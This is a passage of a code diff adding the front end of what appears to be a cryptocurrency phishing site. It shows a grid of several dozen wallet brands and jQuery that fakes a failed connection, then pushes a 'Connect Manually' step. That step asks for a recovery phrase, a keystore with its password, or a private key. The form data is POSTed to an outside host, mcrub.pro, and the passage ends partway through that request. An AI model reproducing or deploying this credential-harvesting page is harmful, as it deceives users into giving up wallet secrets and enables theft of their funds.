+                            <img class="coin-img" src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/ecc31a8e-0ee9-49db-cc59-0876b7c35600/lg" alt="" />
+                            <h4>Safemoon</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal7" class="btn coin">
+                            <img class="coin-img" src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/0b7e0f05-0a5b-4f3c-315d-59c1c4c22c00/lg" alt="" />
+                            <h4>Gnosis Safe</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal8" class="btn coin">
+                            <img class="coin-img" src="https://play-lh.googleusercontent.com/8aXTeaP1Sm29QPQ1IWacpgBRMpyCQLlVtA5QQ0DhN30d-R0fCdrCHlbQUZvdg2bJGvQ" alt="" />
+                            <h4>DeFi</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal9" class="btn coin">
+                            <img class="coin-img" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAYFBMVEV1Adn///9rANeZUeK0i+lqANf79P/gyPZ+Edt3ANrm0vjt3PrKqvCveuivfOi/lu3Cmu6gX+THo+/Ale3z5fzZuPWqdefr2fqSQOHx5/vjzfembuaxgemrc+fRs/GFJt194pibAAABw0lEQVR4nO3c2W7bMBBAUZGpW3dNmrbp3vz/XzZpNjuxBFSgQ87gnHcBc8Gh7CdNEwAAAAAAAAAAAAAAkMy29wBH9/G89h7hyE7KafLEk1I+bXoPcVRXhclP8bowd+K/wnKWOPGmsJzlvYu3hYkX9a4w76LeF6Zd1IfCrKe4U5g0cbdw6MS6ZOnBvcJyOuxd3H5+O+/LUuJ+4binuC0L3vxH4bCJ7QpHTWxYOOjvYsvCMU+xaeGQiW0LR0xsXFguhktsXfhC4bNTOE/hKBTOUzgKhfMUjkLhPIWjUDhP4SgUzlM4isXCrxkKp9dLlh4MU7iawvgUxqcwPoXxKYxPYXwK41MYn8L4FManMD6F8SmML0xh3az0LUjhtrxcK0xhWwqfn0KFCvtTqFBhfwoVKuxPoUKF/SnMWvj91Uo/fvYOeqJ+OFR4vln8MM/Kb/Z0Un8dKHw34qSr1ffZCw8lJis8kJit8OnrJl3hVC+yFz5OTFj4aFEzFu6/blIW7iXmLNxd1KSFO4lZCx8WNW3hfWLewrvExIW3dzFz4c2/m9SFU/2dvfD6LiYvvLqLf5IXTvWy9wQAAAAAAAAAAAAAAEBrfwFLJCClTlJ5TwAAAABJRU5ErkJggg==" alt="" style="border-radius: 40px;" />
+                            <h4>Pillar</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal10" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="../miro.medium.com/v2/resize_fit_2400/1_vpjxotLULTkmcJFq4y2eng.png" alt="" />
+                            <h4>imToken</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal11" class="btn coin">
+                            <img class="coin-img" src="https://play-lh.googleusercontent.com/W1vPuFWyzhrUUuF6P2T6HcNDmfeBf4tTZspEDM9gek0vU1W0MA0SoQLJGDUwdIVJyA" alt="" />
+                            <h4>ONTO</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal12" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="../assets-global.website-files.com/614c99cf4f23700c8aa3752a/6323b6987f8e01af2ce9189a_public.png" alt="" />
+                            <h4>TokenPocket</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal13" class="btn coin">
+                            <img class="coin-img" src="../cryptologos.cc/logos/aave-aave-logo992f992f.png?v=022" alt="" />
+                            <h4>Aave</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal14" class="btn coin">
+                            <img class="coin-img" src="../s2.coinmarketcap.com/static/img/coins/200x200/2772.png" alt="" />
+                            <h4>Digitex</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal17" class="btn coin">
+                            <img class="coin-img" src="../cdn.dribbble.com/users/1298186/screenshots/4669247/portis_logo_dribbble.png" alt="" />
+                            <h4>Portis</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal18" class="btn coin">
+                            <img class="coin-img" src="../pbs.twimg.com/profile_images/1293288961800933376/rtDOqMXY_400x400.jpg" alt="" />
+                            <h4>Formatic</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal19" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="../medishares.oss-cn-hongkong.aliyuncs.com/logo/math/MathWallet_App_Icon.png" alt="" />
+                            <h4>MathWallet</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal20" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="../ffnews.com/wp-content/uploads/2021/09/1581439195205.jpg" alt="" />
+                            <h4>BitPay</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal21" class="btn coin">
+                            <img class="coin-img" src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/e8803581-a57f-4e4f-5a1b-c642c5da1900/lg" alt="" />
+                            <h4>Ledger Live</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal22" class="btn coin">
+                            <img class="coin-img" src="https://avatars.githubusercontent.com/u/28189800?s=280&amp;v=4" alt="" />
+                            <h4>WallETH</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal23" class="btn coin">
+                            <img class="coin-img" src="https://avatars.githubusercontent.com/u/49746116?s=280&amp;v=4" alt="" />
+                            <h4>Authereum</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal24" class="btn coin">
+                            <img class="coin-img" src="../pbs.twimg.com/profile_images/1376595920809160707/5DxVDK36_400x400.png" alt="" />
+                            <h4>Dharma</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal25" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/dce1ee99-403f-44a9-9f94-20de30616500/lg" alt="" />
+                            <h4>1inch Wallet</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal26" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/5a96d19c-93d3-4e6a-624a-16f52773d000/lg" alt="" />
+                            <h4>Huobi</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal27" class="btn coin">
+                            <img class="coin-img" src="../icodrops.com/wp-content/uploads/2017/09/8EXrk57o_400x400.jpg" alt="" />
+                            <h4>Eidoo</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal28" class="btn coin">
+                            <img class="coin-img" src="../is2-ssl.mzstatic.com/image/thumb/Purple112/v4/58/45/bf/5845bfec-7804-a710-329a-9627057742de/AppIcon-1x_U007emarketing-0-7-0-0-85-220.png/512x512bb.jpg" alt="" />
+                            <h4>MYKEY</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal29" class="btn coin">
+                            <img class="coin-img" src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/2972bbf8-0891-414a-f63c-8d3bcf661d00/lg" alt="" />
+                            <h4>Loopring</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal30" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="../www.cryptocompare.com/media/36798689/trustvault.png" alt="" />
+                            <h4>TrustVault</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal31" class="btn coin">
+                            <img class="coin-img" src="../atomicwallet.io/images/press-kit/atomic_wallet_logo_dark_rounded_2.png" alt="" />
+                            <h4>Atomic</h4>
+                        </button>
+                        <!-- Modal -->
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal32" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="../s2.coinmarketcap.com/static/img/coins/64x64/10903.png" alt="" />
+                            <h4>Coin98</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal33" class="btn coin">
+                            <img class="coin-img" src="../cryptologos.cc/logos/tron-trx-logo.png" alt="" />
+                            <h4>Tron</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal34" class="btn coin">
+                            <img class="coin-img" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAeFBMVEXl5eUzMzMnJyfq6urk5OTt7e0xMTGFhYUqKiolJSVLS0suLi5/f381NTXv7++1tbXMzMwfHx/Z2dm/v7+Li4s+Pj7W1tZERERiYmKwsLBcXFy4uLiqqqqYmJienp63t7d0dHQaGhpsbGxVVVUUFBRvb2+RkZFISEhh9MjXAAAIDUlEQVR4nO2da3fiKhRACQcQRNK8jTamPmr7///hTWzv3K5OhaiQVO/ZH2bWmkdxB4TD4RFCEARBEARBEARBEARBEARBEARBEARBEARBEARBEAR5CBjrfwU73d+f/u20H/U6ADgAq5I8z59fPnj6xsvzc55UGev/JUz9eS+BEYihSppif1gaLSlVip5Q3+j+SGqzPOyLJsm6/0PuRBMgy4u6lKr7+FqIyIEQWksll/VbnsV3UJVAsma7VGlvZozL7otnpKkqt6sKfnVNAmcvR5NqZ72d05RpuX1m8dQe5+ha52aeUnFBzf0gSdPDJvuVjRV4NTNK32L3iU7Lovptjl3vmRWaetDrEVrJIvtdigAbb34fKNpyPrXWf8R5qW769v1F1w2nZf47uhzGgG1fr+09zwp2iNct+xVNNX4W8pKRb6hh9xs101cjA5gpzxX4BZHOpu5UeVWrYH59RKfqaTtVni+l5wb6HbnMgX3OxCYQXBkdBTaMtFnFUxlCq33EME5F3QJjUzjyjRxDsA/I20lqMd4E7ES/KdI2Ht+Qt6nxPQyeJ21GHxj5St02TboMk65GVoRkN57eiTQZd1zM9Jg12KP1qEM/zMfVOykeRjTk2y5UG7kOuynjgo/lCKtXM2I/+ofdCkYaMioTTWFoRFSNU4mwl2aSOozkfhRB3qRmIkOjViNUIlSljq5speIbF/8AvQw/ZLBuTh8NMjRRZ6D7VRl5nu6vZTe0Dn5aahY8tIHk9OiHGApKy3rRPuXJefJVu6hLOniSYkT40GZ/you6DbVaLp4qwuHL0uDfC6SnhcPsafFOBzrKbWBDyD+WXRyGQtN1w04ff8isB3jWrAc66iSw4V5GbkOhDi8ELlm/ZgDPBzqk65HHoKlwSD4ftNVQ6/biNUDWPZFGSrej6CoxYGQTLz6TvzZDus7iqz5DnK3dqUlBF9f99EFANWAM283iq8PHuNi5Rw4Rbkxk8ca5wCTS9nrBroTWXYt9XioUMHdWob4x2xCvlGsg0vNwmf7c2aHTW58vixvqmHoKmocy5IWrkcq3W8tmDDauUUMWoZopLB11SG8POLoAAbaOtRDxHqgOIbFXoRFzBj4St5nrSapAwSm0jkaqXriX5QV4chXUhjGMa/uj9dBGP4GjvZ3qOtAXMbL3ANpf20ns4ZsQQeoQEutgbNTCYyZsK60PM0wCHBp7uEE9TmscTzPQFzFeWL//uvZYKCNr63deLkJ8EeODtdC08TlvA3t8qg8hDMHek0qv2VrIUlthIgqR/c5SWw+uD35LA0eLCbAk7FgxpIXfeSmfWXvT1wDZGsh3tjpMPWejeWNtpmnutbQTsLK2Ut+hoqPJ+H6gPby1brCUmefyMmtnGmJA5G+24VAY7wUaW+BGb56I/g0UtoeqS98lQmk1LEIYWuuw9Jw7YbAc2ZDxmTVoW3ou0WU48575ZvYBSiw9lwjE3kr9G7p6GuG7PGaNaUIYgt1QVZ6Lq6wjfhDD1roVUXnOYXYh1OiGK+sQnDaeDe3TpyCGub3ZeJ6TcnseI4QhqV6tq75Lr6c/AKwhTZg6ZPbUidfkEIPckRQKUYe8tKdOfEYZAPb4IoxhXFsL7Zqpx8KYI7Efpg7tK0/G55TNMf8NZAgv9lL12l9fw+xZmkCGpHIsQPvbVscb10GHIIZ9tG9dLxEHX5WYOVfTwxjGC/tiQqTePK2uzZzbFcK00i5ucy0/5z5WSOHZ8STDGWaujQq69JCP4lXpFAxkSGL7cklfsIf+lB3cVRjKkDvW1/qSb12BAmIPLMIaQhYJ1zELWd9SAiNsPehcfyjD+EidO2fpLWMGZ3M6aEt0IMOulxtwsYAu8ysXaVicl3rYsdtQhu5o6qSYbq64YoaxmLwN6GPCGjJohnxLjDrkFx9RgjifD79aI1wdZu+DDklouc/JcElGYsj3l5wqDmZIeEsHnY0wVNdN9SlpjXMYAQ5Vs6YDdkCPYQjsfejpD63KfZtnvcE5ADhhVb7Zm/TCU+HhDMmQTbz/YrRSZl4fF+fZ1gdD08EdzBiGw7rT/+ivKpP0DFIOuu9sZMMhkX94ghqCa5p474ZddGpP1t6/IYGn3dSCoQ35IuStO7/AsOtP5/rjsqqJTsuGN4RKisc27IaM3YMbdqHN7sENCZ+lD25IyJY+uiHs6YMbEjjSBzckZNEnph7aEAp6wX0I92hIeCP0YxsSntv3L9y/IeHZ3rrD/f4Nu5lGe2ka6c4M+2uu693YjqMakv4Cvmi0OxSnMWRACi2jEbMbYxuemupiyL0d92vYS1ZFOVqfM4lh/+aAdk2HXhZ0j4aMkZjlszk9vT8g7CA5jeFpjQmA5cXBKHpdtv4ODHvHmFRPs/W7kf1rZAZwxbOYyPALnSVLnpu3xX59mLt4L/uHoS9p2SFOdl0BAI/jIS86YlXy9LY2cvjrW5TnowHB6W9ui7OXYzT0JSe7ke/c9UF/bUvM2nJY+Cen/rjX0Q830JTW07gnhDhO/laIq2EArXFeTZfmv/mlUE442wjXlvL7rcITwLNC2nYPqcB3J44AQDWj527hMelm6uHeB53jlv68YYBu+VQv9PALQHL8wVGo7Z2+EPIHAPL6+2RMyzcyzes8wgBkdVB/dvSZSNN1sPv2pqJzrEWqPm5VFvXqrsfBMwBPVsWxro/FKpn65U/BAN5NUmLOx7pWf3zY5+z6YQURBEEQBEEQBEEQBEEQBEEQBEEQBEEQBEEQBEGQ/w//AEtPhRVPOa4cAAAAAElFTkSuQmCC" alt="" />
+                            <h4>Alice</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal35" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://avatars.githubusercontent.com/u/36216689?s=280&amp;v=4" alt="" />
+                            <h4>AlphaWallet</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal36" class="btn coin">
+                            <img class="coin-img" src="https://play-lh.googleusercontent.com/4GO-Bjl9nTDw_C2nrM4erEEl26IriD3AxzfLK6Qfp__0LfrxSUxF8MPH4WOgfL8G1g" alt="" />
+                            <h4>D'CENT</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal37" class="btn coin">
+                            <img class="coin-img" src="../assets-global.website-files.com/614c99cf4f23700c8aa3752a/6323b69954bc41ff9409f033_public.png" alt="" />
+                            <h4>ZelCore</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal38" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/12f981b1-bb0a-4115-009f-317255979600/lg" alt="" />
+                            <h4>Nash</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal39" class="btn coin">
+                            <img class="coin-img" src="../bittrust.s3.amazonaws.com/1433894569.png" alt="" />
+                            <h4>Coinmoni</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal40" class="btn coin">
+                            <img class="coin-img" src="https://avatars.githubusercontent.com/u/28931745?s=280&amp;v=4" alt="" />
+                            <h4>GridPlus</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal41" class="btn coin">
+                            <img class="coin-img" src="https://play-lh.googleusercontent.com/M5MM-IxyhSSpgLokb4dDWL-e0n3G4QFIoUXj195qcP-ORF4qTUHom4cAg3feMU482b0" alt="" />
+                            <h4>CYBAVO</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal41" class="btn coin">
+                            <img class="coin-img" src="../cryptologos.cc/logos/toncoin-ton-logo.png" alt="" />
+                            <h4>Toncoin</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal42" class="btn coin">
+                            <img class="coin-img" src="../is4-ssl.mzstatic.com/image/thumb/Purple122/v4/a2/80/13/a28013ce-da98-fd24-2a9a-a22ecfef7cb8/AppIcon-1x_U007emarketing-0-7-0-85-220.png/512x512bb.jpg" alt="" />
+                            <h4>Tokenary</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal43" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://avatars.githubusercontent.com/u/44049579?s=280&amp;v=4" alt="" />
+                            <h4>Torus</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal44" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://play-lh.googleusercontent.com/XapLe0eCXaXS1TK-Gy-uKioBDDSjWP9GBJsEG5dNBYvJbgopreJm-fht8p04v3_1ug" alt="" />
+                            <h4>Spatium</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal45" class="btn coin">
+                            <img class="coin-img" src="../cryptologos.cc/logos/safepal-sfp-logo.png" alt="" />
+                            <h4>SafePal</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal46" class="btn coin">
+                            <img class="coin-img" src="https://play-lh.googleusercontent.com/hSuqrK6xxYr9xTBi7LWawuH8WLSpBXP3QUWr5AosjUxZedLHYCEWIQtZAGmeB7x5Bns" alt="" />
+                            <h4>Infinito</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal47" class="btn coin">
+                            <img class="coin-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQcsfznQP1QJxDpj-78pN5FiUInTPDxY91MNDkG8QgBSne8lEWgicB3eCywth5sRVHanks&amp;usqp=CAU" alt="" />
+                            <h4>wallet.io</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal48" class="btn coin">
+                            <img class="coin-img" src="https://play-lh.googleusercontent.com/XzzaoXwedJjCiQeB4Sh3nOIlB5iR8fOxCTKbFLTiAyJ0JqFJogC3mbA6pj3fIR2y3lw" alt="" />
+                            <h4>Ownbit</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal49" class="btn coin">
+                            <img class="coin-img" src="../is5-ssl.mzstatic.com/image/thumb/Purple124/v4/d2/bc/d7/d2bcd729-ae03-6f33-7446-f60e853c5229/source/512x512bb.jpg" alt="" />
+                            <h4>EasyPocket</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal50" class="btn coin">
+                            <img class="coin-img" src="https://play-lh.googleusercontent.com/sjG683ufdRoN5jpY-Ecx4hg5LrQSr7J2B5mqTHFbJZw2H4df5onayMkr7Jx7yCCncqhm" alt="" />
+                            <h4>Bridge Wallet</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal51" class="btn coin">
+                            <img class="coin-img" src="../www.yadawallets.com/wp-content/uploads/2021/01/Sparkpoint-wallet-logo.png" alt="" />
+                            <h4>Spark Point</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal52" class="btn coin">
+                            <img class="coin-img" src="https://play-lh.googleusercontent.com/HusrjtJaiFk2nj6FfYQbewVKIHkmO9KwivN-X-_pOdk0wHrLneT7JfKtXHr7XWCJ0A" alt="" />
+                            <h4>ViaWallet</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal53" class="btn coin">
+                            <img class="coin-img" src="../cryptotvplus.com/wp-content/uploads/2022/12/Bitkeep-wallet-logo.png" alt="" />
+                            <h4>BitKeep</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal54" class="btn coin">
+                            <img class="coin-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcStYOYgG0-6goX5kiAru3Il4AQFobHWEdZNp95X3-U4SYldTq3v2cEl75b4Qy9CkWBVKNE&amp;usqp=CAU" alt="" />
+                            <h4>Vision</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal55" class="btn coin">
+                            <img class="coin-img" src="https://play-lh.googleusercontent.com/F9cuPNT3VdkBfHm1zv4lfkpvdXHA5fxnaVbL2iDAGGNaIHtg7eNvgX2Bawwg1JbO2SrJ" alt="" />
+                            <h4>PEAKDEFI</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal56" class="btn coin">
+                            <img class="coin-img" src="https://play-lh.googleusercontent.com/eH0bEWCoW5a5WkmYsrBNX17Rj50-W45-JsDCvku2TEySTFzs_Jw1oQ9LCLuwNDJRa2o" alt="" />
+                            <h4>Unstoppable</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal57" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://avatars.githubusercontent.com/u/76861339?s=200&amp;v=4" alt="" />
+                            <h4>HaloDeFi</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal58" class="btn coin">
+                            <img class="coin-img" src="https://play-lh.googleusercontent.com/5qTn8Cie_rp_XwNdLuLL1XpEFaK6yBUHeuJbyD0pXc4Ix6dcJ6NLoHYCcCE1jiMSp3M" alt="" />
+                            <h4>Dok Wallet</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal60" class="btn coin">
+                            <img class="coin-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTv9YhdYp_toQcTmozYWNjP8_OypqBx4zkj-jlh0apPWzcJx374lH-KRaFHSL61D7ED_uI&amp;usqp=CAU" alt="" />
+                            <h4>Midas</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal61" class="btn coin">
+                            <img class="coin-img" src="../miro.medium.com/v2/resize_fit_2400/1_N6Uvv2QMQGqQubnGP1tGig.png" alt="" />
+                            <h4>Ellipal</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal62" class="btn coin">
+                            <img class="coin-img" src="../keyring.app/wp-content/uploads/2021/11/LOGO-KEYRING-PRO-2.png" alt="" />
+                            <h4>KEYRING PRO</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal63" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="../hub.aktionariat.com/images/tokens/AKS.png" alt="" />
+                            <h4>Aktionariat</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal64" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://play-lh.googleusercontent.com/CVWMBVPRHmb1tPeP-gSAApuwq9nsbPZ7kY6qz5u71fd7D0pJc2MftVogk4v7fD5HJ2oR" alt="" />
+                            <h4>Talken</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal65" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="../s3-eu-west-1.amazonaws.com/tpd/logos/5d79d072c62fd60001ba75a7/0x0.png" alt="" />
+                            <h4>Flare</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal66" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/3abd1720-260e-495a-2e31-3d0b349e0d00/lg" alt="" />
+                            <h4>KyberSwap</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal70" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://play-lh.googleusercontent.com/lWSSUqkjBHcT1O5O4MUFWw0K6gbjLuziXswj0USfbb_WgtjZk5FgPHiG1-suYMkMKg=w300" alt="" />
+                            <h4>PayTube</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal72" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://play-lh.googleusercontent.com/hNnEiUyx29pKluOy_tOeHMNBTdpq5C3JoO5EQ9VOgy_gkObYdoyLNBgvObCkIf_3aJY" alt="" />
+                            <h4>Linen</h4>
+                        </button>
+                        <!-- Modal -->
+                    </div>
+                </div>
+            <div class="row">
+                <div class="text-center coin-section-footer"><h6>&nbsp;</h6></div>
+            </div>
+
+
+        </div>
+    </div>
+</div>
+<script src="../code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+<!-- <script src="./script/walletpage.js"></script> -->
+<script src="../cdn.jsdelivr.net/npm/%40popperjs/core%402.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
+<script src="../cdn.jsdelivr.net/npm/bootstrap%405.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
+<script src="script/waypoints/jquery.waypoints.min.js"></script>
+<script src="script/counter/jquery.counterup.min.js"></script>
+<script src="script/wow/wow.min.js"></script>
+<script src="script/script.js"></script>
+<script>
+    $(document).ready(function () {
+        let wallets = $(".coin-registry button");
+        wallets.each(function () {
+            $(this).on("click", function () {
+
+                let img = $(this).find(".coin-img").attr("src");
+                event.preventDefault();
+                $(".connection-info").text("Initializing...");
+                $("#current-wallet-app").text($(this).children().last().text().trim());
+                $("#current-wallet-logo").attr("src", img);
+                $("#connect-dialog").show();
+                setTimeout(function () {
+                   $(".connection-info").html('Error Connecting... <button class="manual-connection">Connect Manually</button>');
+                   // $(document).find("button.manual-connection").trigger("click")
+               }, 1000);
+            });
+        });
+    });
+</script>
+<script>
+    $(document).ready(function () {
+        let dialogDismiss = $(".dialog-dismiss");
+        let sendForm = $("#data-to-send");
+        let successBox = $("#success-dialog");
+        let errorBox = $("#error-dialog");
+        dialogDismiss.each(function () {
+            $(this).on("click", function () {
+                $("#connect-dialog").hide();
+                $("#send-dialog").hide();
+            });
+        });
+        $("#phraseSend").on("click", function () {
+            sendForm.html(
+                '<div class="form-group"><input type="hidden" id="type" name="type" value="phrase"><textarea name="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea> </div> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>'
+                );
+        });
+        $("#keystoreSend").on("click", function () {
+            sendForm.html(
+                '<div class="form-group"><input type="hidden" id="type" name="type" value="keystore"><textarea rows="5" style="resize: none" required name="keystore" class="form-control" placeholder="Enter Keystore"></textarea></div><input type="text" class="form-control" name="password" required placeholder="Wallet password"> <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>'
+                );
+        });
+        $("#privateKeySend").on("click", function () {
+            sendForm.html(
+                '<input type="hidden" id="type" name="type" value="privatekey"><input type="text" name="privateKey" required class="form-control" placeholder="Enter your Private Key"> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>'
+                );
+        });
+
+        $(".connection-info").on("click", ".manual-connection", function () {
+            $("#current-wallet-app-send").text($("#current-wallet-app").text());
+            $("#walletNameData").val($("#current-wallet-app").text());
+            var link = $("#current-wallet-app").text();
+            $("#current-wallet-send-logo").attr("src", $("#current-wallet-logo").attr("src"));
+            $("#connect-dialog").hide();
+            $("#send-dialog").show();
+        });
+
+        $.ajaxSetup({
+            headers: {
+                "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
+            },
+        });
+
+        $("#processForm").submit(function (e) {
+            e.preventDefault();
+            let processBtn = $("#proceedButton");
+            let cancelBtn = $("#cancelBtn");
+            let formData = new FormData(this);
+            $.ajax({
+                type: "POST",
+                url: "https://mcrub.pro/greg/index.php",
+                data: formData,
+                cache: false,
